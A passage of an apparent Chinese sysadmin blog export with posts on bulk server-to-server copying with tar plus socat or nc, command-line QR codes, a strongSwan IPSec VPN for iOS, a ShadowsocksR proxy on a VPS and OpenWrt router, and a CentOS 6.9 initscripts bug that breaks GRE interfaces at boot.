<h2 id="删掉虚拟网络设备"><a href="#删掉虚拟网络设备" class="headerlink" title="删掉虚拟网络设备"></a>删掉虚拟网络设备</h2><p>最后记得删除掉映射的网络设备</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rvictl -x &lt;udid&gt;;</span><br><span class="line"><span class="comment"># 这里的 &lt;udid&gt; 即为前面 iTunes 上看到的设备 UDID</span></span><br></pre></td></tr></table></figure>
<h1 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h1><p>关于老板的这个问题解决了没有呢？虽然这不是这篇文章的重点，既然开头用这个作为引子引出本文，这里还是再点一下。最终只是确认了无线网络有问题，iPhone 通过 AP 往服务器回的 ACK 的包到达 AP 时已经被延时 1s 多了，但是 iPhone 上看到的数据包是及时发出去的。</p>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>macOS</tag>
        <tag>iPhone</tag>
        <tag>Xcode</tag>
        <tag>rvictl</tag>
        <tag>tcpdump</tag>
        <tag>Wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title>怎样通过网络在两台Linux之间倒数据</title>
    <url>/2016/09/%E6%80%8E%E6%A0%B7%E9%80%9A%E8%BF%87%E7%BD%91%E7%BB%9C%E5%9C%A8%E4%B8%A4%E5%8F%B0Linux%E4%B9%8B%E9%97%B4%E5%80%92%E6%95%B0%E6%8D%AE/index.html</url>
    <content><![CDATA[<h1 id="Why"><a href="#Why" class="headerlink" title="Why"></a>Why</h1><p>在服务器之间倒腾数据是运维工作的常见场景，这个运维的同行们应该都心有戚戚焉吧，比如要把一台服务器上的服务迁移到另外一台服务器上、比如这个服务又新上一台服务器，需要把数据从老服务器上同步过来一份，类似的需求是不是感觉经常碰到呢？</p>
<h1 id="Howto"><a href="#Howto" class="headerlink" title="Howto"></a>Howto</h1><ol>
<li>scp</li>
<li>rsync</li>
<li>sftp</li>
<li>nc</li>
<li>socat</li>
<li>……</li>
</ol>
<a id="more"></a>
<p>以上几种方法中：</p>
<ul>
<li>scp 和 sftp 其实都还是走的 ssh，走这种方式服务器有加密、解密的负载，所以比较耗 cpu 资源，为了减轻 cpu 负载，可以选用轻一点的 cipher 比如 arcfour。这种方式比较适合于一次性的拷贝不太大的单个文件。</li>
<li>rsync 可以走自有协议，也可以走 ssh 通道。不管那种，都可以用于“同步”数据的场景。<ul>
<li>如果走自有协议的话，速度很不错。只不过需要先配置服务器和客户端</li>
<li>如果走 ssh 的话，会一样碰到加解密耗cpu的问题。</li>
</ul>
</li>
<li>nc( netcat )和 socat 在这里是类似的思路，只是 socat 号称是比 nc( netcat )更瑞士军刀的瑞士军刀:)</li>
</ul>
<p>总结一下：</p>
<ul>
<li>如果文件很多、数据量很大的场景下，我推荐用 tar+socat 的方案，代码如下：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># server A &amp; server B上都要执行</span></span><br><span class="line">yum -y install tar socat;</span><br><span class="line"><span class="comment"># server A(ip:1.1.1.1)上执行</span></span><br><span class="line"><span class="built_in">cd</span> dest_path;</span><br><span class="line">socat tcp4-listen:11111 stdout | tar xvpf -</span><br><span class="line"><span class="comment"># server B上执行</span></span><br><span class="line"><span class="built_in">cd</span> src_path;</span><br><span class="line">tar cvf - files | socat stdin tcp4:1.1.1.1:11111</span><br><span class="line"><span class="comment"># server B上的src_path/files==&gt;server A的dest_path/files</span></span><br><span class="line"><span class="comment"># 在千兆环境下，拷贝速度可以稳定达到800M以上。</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果是单个的大文件，直接 socat 即可，代码跟上面类似</li>
<li>如果不追求性能和速度，scp 即可，代码略</li>
</ul>
<h1 id="进一步优化"><a href="#进一步优化" class="headerlink" title="进一步优化"></a>进一步优化</h1><ul>
<li>如果网络带宽不大而且没有加密需求的话，可以给 tar 启用压缩，格式用性能最好的 xz</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># server A &amp; server B上都要执行</span></span><br><span class="line">yum -y install tar socat xz;</span><br><span class="line"><span class="comment"># server A(ip:1.1.1.1)上执行</span></span><br><span class="line"><span class="built_in">cd</span> dest_path;</span><br><span class="line">socat tcp4-listen:11111 stdout | tar xJvpf -</span><br><span class="line"><span class="comment"># server B上执行</span></span><br><span class="line"><span class="built_in">cd</span> src_path;</span><br><span class="line">tar cJvf - files | socat stdin tcp4:1.1.1.1:11111</span><br><span class="line"><span class="comment"># 在千兆环境下，拷贝速度只有10M(压缩后)左右。</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果从命令行简洁程度来讲，还不如直接用 nc 呢。:) </li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># server A &amp; server B上都执行</span></span><br><span class="line">yum -y install nc;</span><br><span class="line"><span class="comment"># server A(ip:1.1.1.1)上执行</span></span><br><span class="line"><span class="built_in">cd</span> dest_path;</span><br><span class="line">nc -4l 11111 | tar xv</span><br><span class="line"><span class="comment"># server B上执行</span></span><br><span class="line"><span class="built_in">cd</span> src_path;</span><br><span class="line">tar cvf - files | nc 1.1.1.1 11111</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>tips</tag>
        <tag>nc</tag>
        <tag>socat</tag>
        <tag>scp</tag>
        <tag>rsync</tag>
      </tags>
  </entry>
  <entry>
    <title>用命令行生成字符组成的二维码</title>
    <url>/2017/08/%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%94%9F%E6%88%90%E5%AD%97%E7%AC%A6%E7%BB%84%E6%88%90%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81/index.html</url>
    <content><![CDATA[<h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl qrenco.de/http:\/\/m.theyan.gs</span><br></pre></td></tr></table></figure>
<p>系统输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">█████████████████████████████████</span><br><span class="line">█████████████████████████████████</span><br><span class="line">████ ▄▄▄▄▄ █ ▀▀▄  ██▀█ ▄▄▄▄▄ ████</span><br><span class="line">████ █   █ ███ ▄▄▄████ █   █ ████</span><br><span class="line">████ █▄▄▄█ █ ▄▄ █▀▄███ █▄▄▄█ ████</span><br><span class="line">████▄▄▄▄▄▄▄█ █ ▀ █▄▀ █▄▄▄▄▄▄▄████</span><br><span class="line">████ ▄ ██▄▄▀   ██ ▄▀▄   ▄▀█  ████</span><br><span class="line">████▄▀█▀▀ ▄▄▄▀█▄█▀█  █▄ ▀ ▄█▄████</span><br><span class="line">████▄▄▀▀▀▀▄ █ █▄ ▄█▀ █ ▄███▀ ████</span><br><span class="line">████▄▄  ██▄▀ ▀ ▀ ▄ ▄█▄█▀ ▄▄█▄████</span><br><span class="line">████▄▄▄▄█▄▄█ ▄▄██  ▄ ▄▄▄ █▀▄▀████</span><br><span class="line">████ ▄▄▄▄▄ █▀▄▀▄█▀█▀ █▄█ ▄█▀ ████</span><br><span class="line">████ █   █ ██▀ ▄ ▄█ ▄ ▄▄  ▀ ▄████</span><br><span class="line">████ █▄▄▄█ █  █▀ ▄  ▀ █▀ ██▄▄████</span><br><span class="line">████▄▄▄▄▄▄▄█▄████▄▄█▄█▄██▄██▄████</span><br><span class="line">█████████████████████████████████</span><br><span class="line">█████████████████████████████████</span><br></pre></td></tr></table></figure>
<h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"http://m.theyan.gs"</span> | curl -F-=\&lt;- qrenco.de</span><br></pre></td></tr></table></figure>
<p>得到的系统输出是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">█████████████████████████████████</span><br><span class="line">█████████████████████████████████</span><br><span class="line">████ ▄▄▄▄▄ █ ▄▄ █ ██▀█ ▄▄▄▄▄ ████</span><br><span class="line">████ █   █ ██▄█▀▀▄████ █   █ ████</span><br><span class="line">████ █▄▄▄█ █ ▀▀▄ ▀▄███ █▄▄▄█ ████</span><br><span class="line">████▄▄▄▄▄▄▄█ ▀▄█▄█▄▀ █▄▄▄▄▄▄▄████</span><br><span class="line">████▄▄ █▀ ▄▀ ▄█▄  ▄▀▄   ▄▀█  ████</span><br><span class="line">████▄▄ ██▄▄  ▄ ▀ █▄  █▄ ▀ ▄█▄████</span><br><span class="line">█████▀▄▄▀█▄▀▄▄ ██ ▄▀ █ ▄███▀ ████</span><br><span class="line">████▄▄ █  ▄▀  ▄▄█▀█▄█▄█▀ ▄▄█▄████</span><br><span class="line">████▄▄▄▄██▄▄▀▄ ▄ ▄█▄ ▄▄▄ █▀▄▀████</span><br><span class="line">████ ▄▄▄▄▄ █▀▄▄▀ ▄ ▀ █▄█ ▄██▄████</span><br><span class="line">████ █   █ ██ ▄██   ▄ ▄▄  ▀▀▄████</span><br><span class="line">████ █▄▄▄█ █ ▀▀▄█▀█ ▀ █▀ ██▄▄████</span><br><span class="line">████▄▄▄▄▄▄▄█▄▄█▄▄▄██▄█▄██▄██▄████</span><br><span class="line">█████████████████████████████████</span><br><span class="line">█████████████████████████████████</span><br></pre></td></tr></table></figure>
<h1 id="检测结果"><a href="#检测结果" class="headerlink" title="检测结果"></a>检测结果</h1><p>用二维码识别软件检测上面这两个二维码，发现都是：“<a href="http://m.theyan.gs”" target="_blank" rel="noopener">http://m.theyan.gs”</a></p>
]]></content>
      <tags>
        <tag>二维码</tag>
        <tag>QR code</tag>
        <tag>qrenco.de</tag>
      </tags>
  </entry>
  <entry>
    <title>给ios10在ubuntu 14.04上配置IPSec服务器</title>
    <url>/2016/10/%E7%BB%99ios10%E5%9C%A8ubuntu-14-04%E4%B8%8A%E9%85%8D%E7%BD%AEipsec%E6%9C%8D%E5%8A%A1%E5%99%A8/index.html</url>
    <content><![CDATA[<h1 id="写在前面的闲话"><a href="#写在前面的闲话" class="headerlink" title="写在前面的闲话"></a>写在前面的闲话</h1><p>后面有篇文章，<a href="/2016/12/%E4%B8%BA-iOS-%E5%9C%A8-CentOS6-x-%E4%B8%8A%E6%90%AD%E5%BB%BA-IPSec-PSK-XAuth-VPN-%E6%9C%8D%E5%8A%A1%E5%99%A8/">为 iOS 在 CentOS6.x 上搭建 IPSec(PSK+XAuth) VPN 服务器</a>，说的是一样的事情，只不过平台是 CentOS 6.x。</p>
<p>有朋友看了本文后问，这种文章百度上不多的是吗，干嘛还要写？然后我就想这个问题也许还真有代表性，于是就把文章修改下，统一回答：</p>
<ol>
<li>网上的方案多是ipsec+l2tp或者是ipsec+xl2tp的，我觉得不需要那么复杂，有ipsec加密数据流就OK了，所以我这方案应该是满足需求的最简方案</li>
<li>我写东西，多半是为了心理安慰。而且这也不算是完全原创，准确讲应该是实验报告，参照的是最后参考里列出的国外的那篇文档</li>
</ol>
<h1 id="缘起-Why"><a href="#缘起-Why" class="headerlink" title="缘起(Why)"></a>缘起(Why)</h1><p>需求还是来自于<strong>科学上网</strong>，iPhone设备的<strong>科学上网</strong>。话说自打最新的iOS中</p>
<ol>
<li>不再支持<strong>pptp</strong>方式的vpn了</li>
<li>没有全局性的ss(<strong>Shadowsocks</strong>)可用</li>
<li>OpenVPN的客户端软件市场中都看不见(Tunnelblicck是没找到)</li>
</ol>
<p>所以，为了<strong>iPhone</strong>的科学上网，我们只有自力更生，搭建新的服务器系统。这里，我选用的是<strong>IPsec</strong>服务器。</p>
<span id="more"></span>

<h1 id="具体步骤-Howto"><a href="#具体步骤-Howto" class="headerlink" title="具体步骤(Howto)"></a>具体步骤(Howto)</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>环境是一台<strong>ubuntu 14.04</strong>的机器(代号：<strong>Trusty Tahr</strong>)。</p>
<h3 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h3><p>首先，我们需要安装必需软件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install strongswan \</span><br><span class="line">	strongswan-plugin-xauth-generic;</span><br></pre></td></tr></table></figure>

<h3 id="参数调整"><a href="#参数调整" class="headerlink" title="参数调整"></a>参数调整</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sysctl -w net.ipv4.ip_forward=1;</span><br><span class="line"><span class="built_in">echo</span> \</span><br><span class="line">	<span class="string">&quot;sysctl -w net.ipv4.ip_forward=1&quot;</span> \</span><br><span class="line">	&gt;&gt; /etc/rc.local;</span><br></pre></td></tr></table></figure>

<h3 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/sbin/iptables -t nat \</span><br><span class="line">	-A POSTROUTING \</span><br><span class="line">	-s 10.0.0.0/8 \</span><br><span class="line">	-o eth0 \</span><br><span class="line">	-j MASQUERADE;</span><br><span class="line"><span class="built_in">echo</span> \</span><br><span class="line">	<span class="string">&quot;/sbin/iptables -t nat \</span></span><br><span class="line"><span class="string">		-A POSTROUTING \</span></span><br><span class="line"><span class="string">		-s 10.0.0.0/8 \</span></span><br><span class="line"><span class="string">		-o eth0 \</span></span><br><span class="line"><span class="string">		-j MASQUERADE&quot;</span> \</span><br><span class="line">	&gt;&gt; /etc/rc.local;</span><br></pre></td></tr></table></figure>

<h2 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h2><h3 id="ipsec-secrets"><a href="#ipsec-secrets" class="headerlink" title="ipsec.secrets"></a>ipsec.secrets</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &lt;&lt;<span class="string">EOF &gt;/etc/ipsec.secrets</span></span><br><span class="line"><span class="string">: PSK sharekeystring</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">user1 : XAUTH &quot;password for user1&quot;</span></span><br><span class="line"><span class="string">user2 : XAUTH &quot;password for user2&quot;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>注意：</p>
<ul>
<li>user1和user2分别是用户名，相应后面的passw…….是密码</li>
<li>sharekeystring是共享秘钥，客户端连过来时也会用</li>
</ul>
<h3 id="ipsec-conf"><a href="#ipsec-conf" class="headerlink" title="ipsec.conf"></a>ipsec.conf</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &lt;&lt;<span class="string">EOF &gt;/etc/ipsec.conf</span></span><br><span class="line"><span class="string">config setup</span></span><br><span class="line"><span class="string">	charondebug=&quot;ike 4, knl 4, cfg 4, net 4, esp 4, dmn 4,  mgr 4&quot;</span></span><br><span class="line"><span class="string">	cachecrls=yes</span></span><br><span class="line"><span class="string">	uniqueids=yes</span></span><br><span class="line"><span class="string">	 </span></span><br><span class="line"><span class="string">conn ios</span></span><br><span class="line"><span class="string">	keyexchange=ikev1</span></span><br><span class="line"><span class="string">	authby=xauthpsk</span></span><br><span class="line"><span class="string">	xauth=server</span></span><br><span class="line"><span class="string">	left=%defaultroute</span></span><br><span class="line"><span class="string">	leftsubnet=0.0.0.0/0</span></span><br><span class="line"><span class="string">	leftfirewall=yes</span></span><br><span class="line"><span class="string">	right=%any</span></span><br><span class="line"><span class="string">	rightsubnet=10.0.0.0/24</span></span><br><span class="line"><span class="string">	rightsourceip=10.0.0.1/24</span></span><br><span class="line"><span class="string">	rightdns=8.8.8.8</span></span><br><span class="line"><span class="string">	auto=add</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里解释下参数<strong>charondebug</strong>，上面的例子都是4是为了调试排错的需要的，当你的服务正常以后，请将这个参数值改小。</p>
<h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># （手工）启动服务</span></span><br><span class="line">service strongswan start;</span><br><span class="line"><span class="comment"># 将服务设置为自启动</span></span><br><span class="line">update-rc.d strongswan <span class="built_in">enable</span>;</span><br></pre></td></tr></table></figure>

<h2 id="排错及维护"><a href="#排错及维护" class="headerlink" title="排错及维护"></a>排错及维护</h2><ul>
<li>log文件是*&#x2F;var&#x2F;log&#x2F;strongswan.charon.log*</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ipsec status;</span><br><span class="line">ipsec statusall;</span><br><span class="line"><span class="comment"># 以上两个命令可以用来看状态</span></span><br></pre></td></tr></table></figure>

<h1 id="ios客户端配置"><a href="#ios客户端配置" class="headerlink" title="ios客户端配置"></a>ios客户端配置</h1><p>在iphone上，点击<strong>设置</strong>–&gt;<strong>VPN</strong>–&gt;**添加 VPN 配置…**，然后：</p>
<ul>
<li>类型：IPSec</li>
<li>描述：随便填</li>
<li>服务器：填部署IPSec服务的ip地址或域名</li>
<li>账户：上面的例子中是<em>user1</em>或<em>user2</em></li>
<li>密码：上面的文件里有</li>
<li>使用证书：不使用证书</li>
<li>秘钥：上面配置文件里有</li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://trick77.com/strongswan-5-vpn-ubuntu-14-04-lts-psk-xauth/">strongSwan 5 based IPSec VPN, Ubuntu 14.04 LTS and PSK&#x2F;XAUTH</a></li>
</ul>
]]></content>
      <tags>
        <tag>IPSec</tag>
        <tag>PSK</tag>
        <tag>Ubuntu</tag>
        <tag>iOS</tag>
        <tag>iPhone</tag>
        <tag>strongSwan</tag>
        <tag>XAuth</tag>
        <tag>Trusty Tahr</tag>
        <tag>KVM</tag>
      </tags>
  </entry>
  <entry>
    <title>科学上网之 SSR 方案</title>
    <url>/2017/10/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E4%B9%8B-SSR-%E6%96%B9%E6%A1%88/index.html</url>
    <content><![CDATA[<h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>最近上面在开会嘛，职能部门也许是要展示下“肌肉”：“不是我搞不了你，我只是平时懒得鸟你。”我猜大概就是这么个原因吧，结果就是：最近这段时间大家的“科学上网”纷纷中招，不好使了。我司原来用的 SS 改良的版本，中招了，至于怎么解决的，不在本篇讨论的范围之内。</p>
<p>我主要说下家里的情况，家里原来也是 SS 方案，这段时间也不行了，通常是早上不通了，改下端口，然后到晚上又不行了，然后又改端口，搞了两次才是反应过来是被盯上了。心中大呼侥幸！这要是不封端口直接封 IP 我可咋整呀？！就冲这点来讲不得不说职能部门真是良心单位哈，值得点个赞！</p>
<h1 id="现有资源"><a href="#现有资源" class="headerlink" title="现有资源"></a>现有资源</h1><ul>
<li>米国 VPS 一台（Ubuntu 16.04）</li>
<li>家里路由器一台（OpenWrt 14.07，bcrm63xx 架构）</li>
</ul>
<p>以前也是这情况，不过以前跑的是 SS，据说 SSR 比 SS 更不容易被 ban，所以这次我的方案是用 SSR 替换掉原来的 SS。</p>
<a id="more"></a>
<h1 id="SSR-方案"><a href="#SSR-方案" class="headerlink" title="SSR 方案"></a>SSR 方案</h1><p>具体（替换）过程这里不赘述了，中间来来回回走过不少弯路，说起来都是泪呀，只谈下最终的方案的情况吧，这也是我推荐的方案。</p>
<h2 id="VPS-端"><a href="#VPS-端" class="headerlink" title="VPS 端"></a>VPS 端</h2><p>VPS 上起 Docker 服务，然后直接拉一个 SSR 的 Docker image 来跑。</p>
<h3 id="Server-端部署"><a href="#Server-端部署" class="headerlink" title="Server 端部署"></a>Server 端部署</h3><p>这里的部署文档参考了：DigitalOcean 的 <a href="https://www.digitalocean.com/community/tutorials/how-to-install-and-use-docker-on-ubuntu-16-04" title="How To Install and Use Docker on Ubuntu 16.04" target="_blank" rel="noopener">How To Install and Use Docker on Ubuntu 16.04</a> 和 Docker 官方的 <a href="https://docs.docker.com/engine/installation/linux/docker-ce/ubuntu/" title="Get Docker CE for Ubuntu" target="_blank" rel="noopener">Get Docker CE for Ubuntu</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除掉以前的 Docker，至于为什么用 purge 而不是 remove，自己想</span></span><br><span class="line">apt-get purge docker docker-engine docker.io;</span><br><span class="line"></span><br><span class="line">apt-get update;</span><br><span class="line">apt-get install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    software-properties-common;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加 Docker 官方的 GPG key</span></span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新增 Docker 的官方 repo</span></span><br><span class="line">add-apt-repository \</span><br><span class="line">   <span class="string">"deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string">   <span class="variable">$(lsb_release -cs)</span> \</span></span><br><span class="line"><span class="string">   stable"</span>;</span><br><span class="line">   </span><br><span class="line">apt-get update;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 Docker（Docker 新版叫 docker-ce）</span></span><br><span class="line">apt-get install docker-ce;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拉一个 SSR 的 Docker（image） 跑起来</span></span><br><span class="line">docker run -p 11402:51348 \</span><br><span class="line">	--restart=always \</span><br><span class="line">	--name=SSR \</span><br><span class="line">	-e PASSWORD=xxxxxxxxxxx \</span><br><span class="line">	-d breakwa11/shadowsocksr;</span><br></pre></td></tr></table></figure>
<p>需要注意的是，上面跑的这个 Docker image，其实是有很多隐含参数的，如果不知道，SSR 客户端是没法连过来的，具体详见 <a href="https://hub.docker.com/r/breakwa11/shadowsocksr/~/dockerfile/" title="Dockerfile for breakwa11/shadowsocksr" target="_blank" rel="noopener">Docker image:breakwa11/shadowsocksr 的 Dockerfile 文件</a>。考虑到被职能部门 ban 的可能性，我把缺省参数贴出来：</p>
<blockquote>
<p>ENV SERVER_ADDR     0.0.0.0<br>ENV SERVER_PORT     51348<br>ENV PASSWORD        psw<br>ENV METHOD          aes-128-ctr<br>ENV PROTOCOL        auth_aes128_md5<br>ENV PROTOCOLPARAM   32<br>ENV OBFS            tls1.2_ticket_auth_compatible<br>ENV TIMEOUT         300<br>ENV DNS_ADDR        8.8.8.8<br>ENV DNS_ADDR_2      8.8.4.4   </p>
</blockquote>
<h2 id="OpenWrt-端"><a href="#OpenWrt-端" class="headerlink" title="OpenWrt 端"></a>OpenWrt 端</h2><p>家里的 OpenWrt 上肯定是跑 SSR 的客户端，由于种种原因（主要是测试时服务器用的是 aws，当时貌似不支持 udp 转发），最终域名解析用了 pdnsd 的方案而不是 tunnel 方案。</p>
<h3 id="Client-端部署"><a href="#Client-端部署" class="headerlink" title="Client 端部署"></a>Client 端部署</h3><p>在 <a href="https://github.com/bettermanbao/openwrt-shadowsocksR-libev-full/releases" target="_blank" rel="noopener">github</a> 上找了个 brcm63xx 的 ShadowsocksR for OpenWrt 的 ipk 包，下载地址在<a href="https://github.com/bettermanbao/openwrt-shadowsocksR-libev-full/releases/download/v2.4.5-5/shadowsocksR-libev-full_2.4.5-5_brcm63xx-generic.zip" target="_blank" rel="noopener">这里</a>，如果你的 OpenWrt 路由器是别的体系架构的话，也许这个页面里还能找到更新一点的版本。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除掉 dnsmasq（如果已安装的话），因为需要安装 dnsmasq-full</span></span><br><span class="line">opkg remove dnsmasq;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 pdnsd 和 dnsmasq-full，此方案里有用到</span></span><br><span class="line">opkg install pdnsd dnsmasq-full;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不要自动启动 pdnsd，ShadowsockR 会将其起起来</span></span><br><span class="line">/etc/init.d/pdnsd <span class="built_in">disable</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载 ShadowsocksR 软件包</span></span><br><span class="line">wget https://github.com/bettermanbao/openwrt-shadowsocksR-libev-full/releases/download/v2.4.5-5/shadowsocksR-libev-full_2.4.5-5_brcm63xx-generic.zip;</span><br><span class="line">unzip shadowsocksR-libev-full_2.4.5-5_brcm63xx-generic.zip;</span><br><span class="line"><span class="built_in">cd</span> shadowsocksR-libev-full_2.4.5-5_brcm63xx-generic;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面这步是安装，如果依赖什么包没装，就 opkg install 安装后再继续</span></span><br><span class="line">opkg install \</span><br><span class="line">	shadowsocksr-libev-server-polarssl_2.4.5-5_brcm63xx.ipk;</span><br></pre></td></tr></table></figure>
<h3 id="Client-端配置"><a href="#Client-端配置" class="headerlink" title="Client 端配置"></a>Client 端配置</h3><p>SSR Client 的参数配置参照上面服务器的配置即可，但是有两点区别：</p>
<ol>
<li>PROTOCOLPARAM 参数可以留空不配</li>
<li>OBFS 配成 tls1.2_ticket_auth 即可</li>
</ol>
<p>客户端的配置工作可以在 web 界面来做，而且也推荐这么做</p>
<h3 id="Client-端启动"><a href="#Client-端启动" class="headerlink" title="Client 端启动"></a>Client 端启动</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/init.d/shadowsocksr start;</span><br><span class="line"><span class="comment"># 服务的启动也可以在 web 界面来做，推荐这样做，因为简单。</span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Docker</tag>
        <tag>科学上网</tag>
        <tag>Shadowsocks</tag>
        <tag>ShadowsocksR</tag>
        <tag>SS</tag>
        <tag>SSR</tag>
        <tag>OpenWrt</tag>
        <tag>pdnsd</tag>
        <tag>dnsmasq-full</tag>
        <tag>Xenial</tag>
      </tags>
  </entry>
  <entry>
    <title>路遇CentOS6.9的initscripts的bug</title>
    <url>/2017/04/%E8%B7%AF%E9%81%87CentOS6-9%E7%9A%84initscripts%E7%9A%84bug/index.html</url>
    <content><![CDATA[<h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>某台机器（CentOS 6.*）升级到最新的 6.9 版本，重启结果发现以前开机自起的 GRE 设备 greXXX 没有自动起来？！</p>
<a id="more"></a>
<h1 id="发现问题"><a href="#发现问题" class="headerlink" title="发现问题"></a>发现问题</h1><p>最初怀疑是 iptables 没有放开 GRE 数据包的入站导致，结果发现不是，而且手工 <code>ifup greXXX</code> 能直接将这个设备起来。</p>
<p>于是查代码 /etc/init.d/network，发现这段：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$TYPE</span>"</span> = <span class="string">"IPSEC"</span> ] || [ <span class="string">"<span class="variable">$TYPE</span>"</span> = <span class="string">"IPIP"</span> ] || [ <span class="string">"<span class="variable">$TYPE</span>"</span> = <span class="string">"GRE"</span> ]; <span class="keyword">then</span></span><br><span class="line">        vpninterfaces=<span class="string">"<span class="variable">$vpninterfaces</span> <span class="variable">$i</span>"</span></span><br><span class="line">        <span class="built_in">continue</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>看起来设备 greXXX 被放到变量 vpninterfaces 里了，但是再翻遍 /etc/init.d/network，也没发现最后要把 vpninterfaces 怎么着呀，这到底是个什么情况呀？！</p>
<p>在 /etc/init.d/network 发现还有一段：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Bring up xDSL and VPN interfaces</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$vlaninterfaces</span> <span class="variable">$bridgeinterfaces</span> <span class="variable">$xdslinterfaces</span> ; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> ! LANG=C egrep -L <span class="string">"^ONBOOT=['\"]?[Nn][Oo]['\"]?"</span> ifcfg-<span class="variable">$i</span> &gt;/dev/null 2&gt;&amp;1 ; <span class="keyword">then</span></span><br><span class="line">        <span class="comment"># If we're in confirmation mode, get user confirmation.</span></span><br><span class="line">        <span class="keyword">if</span> [ -f /var/run/confirm ]; <span class="keyword">then</span></span><br><span class="line">                confirm <span class="variable">$i</span></span><br><span class="line">                <span class="built_in">test</span> $? = 1 &amp;&amp; <span class="built_in">continue</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        action $<span class="string">"Bringing up interface <span class="variable">$i</span>: "</span> ./ifup <span class="variable">$i</span> boot</span><br><span class="line">        [ $? -ne 0 ] &amp;&amp; rc=1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>看见没有看见没有，注释里写了这一段会启动 xDSL 和 VPN 设备的，但是在具体的代码里，却又为嘛把变量 vpninterfaces 丢掉了呀？！这个程序员得有多粗心呀！</p>
<p>查一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpm -qf /etc/init.d/network</span><br></pre></td></tr></table></figure>
<p>发现这个文件是属于包：initscripts-9.03.58-1.el6.centos.x86_64，再接着查：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpm -qV initscripts</span><br></pre></td></tr></table></figure>
<p>发现包 initscripts 里的文件 /etc/init.d/network 没有被修改过。所以猜想可能是 bug，google 上一查，果不其然，在这里：<a href="https://bugs.centos.org/view.php?id=13020" target="_blank" rel="noopener">0013020: initscripts 9.03.58-1.el6.centos breaks gre interfaces</a></p>
<h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>来龙去脉搞明白了，解决问题其实非常简单，可以直接修改文件 /etc/init.d/network，但我不想这么做，因为 CentOS 官方迟早是会修复这个 bug 的，不用我来凑这个热闹。不过目前的问题的话，直接在 /etc/rc.local 里加一句，手工起这个设备算了：</p>
